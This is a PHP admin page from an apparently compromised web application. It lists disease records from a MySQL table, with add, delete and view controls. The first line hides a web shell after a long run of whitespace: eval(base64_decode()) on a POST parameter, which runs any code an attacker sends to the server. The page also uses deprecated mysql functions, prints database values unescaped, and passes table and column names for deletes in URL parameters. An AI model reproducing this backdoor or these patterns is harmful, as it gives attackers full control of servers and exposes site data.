<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n7b2bbe']));?><?php include "jquery.php"; ?>



	<div id="control-bar" class="grey-bg clearfix"><div class="container_12">
	
		<div class="float-left">
		<!--	<button type="button"><img src="images/icons/fugue/navigation-180.png" width="16" height="16"> Back to list</button> -->
			<button type="button" target="_new" onClick="window.open('production/diseasedetails.php');">Open report</button>
		</div>
		
		<div class="float-right"> 
			<button type="button" onclick="document.location='dashboardsub.php?page=common_adddiseases';"><img src="images/icons/fugue/tick-circle.png" width="16" height="16"> Add</button>
		<!--	<button type="button" class="grey">View</button> 
			 <button type="button" disabled="disabled">Disabled</button>
			<button type="button" class="red">Authorize</button> -->


		</div>
			
	</div></div>
	
	<article class="container_12">
		

		
		
		<div class="clear"></div>
		

		<div class="clear"></div>
		

		
		<section class="grid_12">
			<div class="block-border"><form class="block-content form" id="table_form" method="post" action="">
				<h1>Diseases Details</h1>
			
				<table class="table sortable no-margin" cellspacing="0" style="size:50%" width="100%">
				
					<thead>
						<tr>
						<th scope="col">
								<span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>
								Code
							</th>
							<th scope="col">
								<span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>
								Disease Name
							</th>
							<th scope="col">
								<span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>
								Image
							</th>
                                          <th>Actions</th>
						</tr>
					</thead>
					
					<tbody>
						

<?php 
     include "config.php"; 
     $query1 = "SELECT * FROM tbl_diseases order by name asc"; 
     $result1 = mysql_query($query1,$conn); 
     while($row1 = mysql_fetch_assoc($result1)) 
     { 
 ?>
         <tr>
		  <td><?php echo $row1['code']; ?></td>
            <td><?php echo $row1['name']; ?></td>
            <td><img src="diseases/<?php if($row1['image'] == "") { echo "noimage.jpg"; } else { echo $row1['image']; } ?>" width="50" height="45" />
            </td>
            <td>
              <a href="dashboardsub.php?page=breeder_deletemaster&id=<?php echo $row1['id']; ?>&col=<?php echo "id"; ?>&name=<?php echo "tbl_diseases"; ?>"><img src="images/icons/fugue/cross-circle.png" style="border:0px" title="Delete" /></a>
              &nbsp;&nbsp;&nbsp;
              <a href="#" onclick="window.open('viewdisease.php?id=<?php echo $row1['id']; ?>','DiseasesDetails','width=500,height=600,toolbar=no,menubar=yes,scrollbars=no,resizable=yes'); "><img src="search.png" title="View" style="border:0px" /></a> 
            </td>
         </tr>
<?php }  ?> 

						
					</tbody>
				
				</table>
					
			</form></div>
		</section>
		
		
		<div class="clear"></div>
		
	</article>
